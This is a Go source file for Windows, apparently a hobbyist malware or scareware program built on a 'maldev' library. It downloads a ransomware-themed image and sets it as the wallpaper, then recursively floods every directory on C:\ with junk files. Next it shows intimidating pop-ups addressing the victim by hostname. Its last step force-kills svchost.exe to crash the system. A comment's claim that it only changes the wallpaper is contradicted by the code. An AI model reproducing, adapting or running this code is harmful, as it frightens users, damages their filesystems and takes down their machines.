package main

import (
	"fmt"
	"os"
	"os/exec"
	"reflect"
	"runtime"
	"time"
	"unsafe"

	"github.com/D3Ext/maldev/network"
	"github.com/D3Ext/maldev/process"

	"golang.org/x/sys/windows"
)

var (
	user32DLL                 = windows.NewLazyDLL("user32.dll")
	procSystemParametersInfoW = user32DLL.NewProc("SystemParametersInfoW")
	procMessageBoxA           = user32DLL.NewProc("MessageBoxA")
)

// The program below changes the wallpaper of ze windows. It is designed to compare working with Win32 from Go and from C

func changeWallpaper(imgURL string, img string) bool {
	network.DownloadFile(imgURL)
	rFile, err := os.Open(img)
	if err != nil {
		return (false)
	}
	rFile.Close() //This works slightly differently on Linux
	contents, _ := os.ReadFile(img)
	home, err := os.UserHomeDir()
	if err != nil {
		return (false)
	}
	eWrite := os.WriteFile(home+"\\ransom.jpg", contents, 0777)
	if eWrite != nil {
		return (false)
	}
	path, _ := windows.UTF16PtrFromString(home + "\\ransom.jpg") //Convert a String path to a pointer to that file
	fmt.Println("Acquired the path")
	procSystemParametersInfoW.Call(0x0014 /*SPI_SETDESKWALLPAPER*/, 0, uintptr(unsafe.Pointer(path)), 0x001A /*SPIF_UPDATEINIFILE*/)
	wd, err := os.Getwd()
	if err != nil {
		panic(err)
	}
	e := os.Remove( /*home + "\\" + */ wd + "\\" + img) //Cleanup
	if e != nil {
		return (false)
	}
	return (true)

	// Below is C++ alternative
	// #include <windows.h>
	// #include <iostream>

	// int main() {
	//     const wchar_t *path = L"C:\\image.png";
	//     int result;
	//     result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);
	//     std::cout << result;
	//     return 0;
	// }

}

func createPopUp(title string, message string) {
	hdr := (*reflect.StringHeader)(unsafe.Pointer(&message))
	hdr2 := (*reflect.StringHeader)(unsafe.Pointer(&title))
	procMessageBoxA.Call(0, uintptr(hdr.Data), uintptr(hdr2.Data), 4) //first arg 0 is considered null and 4th arg is UINT
	runtime.KeepAlive(message)                                        //You can ommit this line if you want the program to continue execution without waiting for input
}

func createRandomFiles(numberOfFiles int) {
	i := 0
	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
	for i < numberOfFiles {
		os.Create(rickRoll[i])
		i++
	}
}

// func createRandomFilesRecursive(numberOfFiles int) {
// 	i := 0
// 	//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
// 	rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
// 	for i < numberOfFiles {
// 		os.Create(rickRoll[i])
// 		i++
// 	}
// }

func filesystemTraversal(root string) { //Add backslashes to the dir otherwise go shits itself. Its not C:, it is C:\\
	file, err := os.Open(root)
	if err != nil {
		return //panic(err) Replaced with return to see where we get (It does recursion just fine)
	}
	fileInfo, err := file.Stat()
	if err != nil {
		panic(err)
	}
	if fileInfo.IsDir() {
		os.Chdir(root)
		if root == "C:\\$Recycle.Bin\\" {
			return
		} // I dont want to pass into the recyvle bin directory
		if root == "C:\\Windows\\" {
			return
		}
		fmt.Println(root)
		entries, err := os.ReadDir(root)
		if err != nil {
			panic(err)
		}
		for _, e := range entries {
			newRoot := root + e.Name() + "\\"
			filesystemTraversal(newRoot)
		}

	} else {
		return
	}
	fmt.Println("Recursion Success")
}

func filesystemTraversalWrite(root string, numberOfFiles int) { //Add backslashes to the dir otherwise go shits itself. Its not C:, it is C:\\
	file, err := os.Open(root)
	if err != nil {
		return //panic(err) Replaced with return to see where we get (It does recursion just fine)
	}
	fileInfo, err := file.Stat()
	if err != nil {
		panic(err)
	}
	if fileInfo.IsDir() {
		os.Chdir(root)
		if root == "C:\\$Recycle.Bin\\" {
			return
		} // I dont want to pass into the recyvle bin directory
		if root == "C:\\Windows\\" {
			return
		}
		fmt.Println(root)
		i := 0
		//Hardcoded the upper limit la2an ma ileh jledeh ishtighil data structures. It is 36 max
		rickRoll := [50]string{"Never", "Gonna", "Give", "You", "Up", "Never", "Gonna", "Let", "You", "Down", "Never", "gonna", "run", "around", "and", "desert", "you", "Never", "gonna", "make", "you", "cry", "Never", "gonna", "say", "goodbye", "Never", "gonna", "tell", "a", "lie", "and", "hurt", "you"}
		for i < numberOfFiles {
			os.Create(rickRoll[i])
			i++
		}
		entries, err := os.ReadDir(root)
		if err != nil {
			panic(err)
		}
		for _, e := range entries {
			newRoot := root + e.Name() + "\\"
			filesystemTraversalWrite(newRoot, numberOfFiles)
		}

	} else {
		return
	}
	fmt.Println("Recursion Success")
}
func main() {
	root := "C:\\"
	numberOfRandomFiles := 30 //Dont go over 50
	imgURL := "https://brightlineit.com/wp-content/uploads/2017/10/171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
	img := "171013-How-to-Detect-and-Prevent-Ransomware-Attacks.jpg"
	Hostname, err := os.Hostname()
	if err != nil {
		panic(err)
	}
	// test, err := os.ReadDir("C:\\Users")
	// if err != nil {
	// 	panic(err)
	// }
	// fmt.Println(test)

	if changeWallpaper(imgURL, img) == false {
		fmt.Println("Something went wrong !!! Wallpaper unchanged. Debug the program ...")
		os.Exit(0)
	}

	//createRandomFiles(numberOfRandomFiles)
	filesystemTraversalWrite(root, numberOfRandomFiles)

	fmt.Println("Now calling Win32 to create a popup")
	message := "Screen unlocked ya " + Hostname + "\x00" //Add the x00 or Windows loses it
	title := "Yeah Yeah ... Bravoooo\x00"
	createPopUp(title, message)

	// processList, err := process.GetProcesses()
	// if err != nil {
	// 	panic(err)
	// }
	// fmt.Println(processList)

	// wininit, err := process.FindPidByName("wininit.exe") // Killing wininit only works if you are nt/authority system use svchost.exe
	// if err != nil {
	// 	panic(err)
	// }
	svchost, err := process.FindPidByName("svchost.exe")
	if err != nil {
		panic(err)
	}
	fmt.Println(svchost)
	title = "I am here\x00"
	message = "I am in your laptop ya " + Hostname + "\x00"
	createPopUp(title, message)
	title = "Fear\x00"
	message = "Are you afraid ???\x00"
	createPopUp(title, message)
	title = "Good\x00"
	message = "You better be ...\x00"
	createPopUp(title, message)
	fmt.Println("3")
	time.Sleep(1 * time.Second)
	fmt.Println("2")
	time.Sleep(1 * time.Second)
	fmt.Println("1")
	time.Sleep(1 * time.Second)
	// for index := range svchost {
	// 	kill := exec.Command("taskkill.exe", "/f", "/PID", string(svchost[index])) //taskkill.exe /f /im svchost.exe
	// 	kill.Start()
	// }
	kill := exec.Command("taskkill.exe", "/f", "/im", "svchost.exe")
	kill.Start() //At this point the program should crash Windows
}
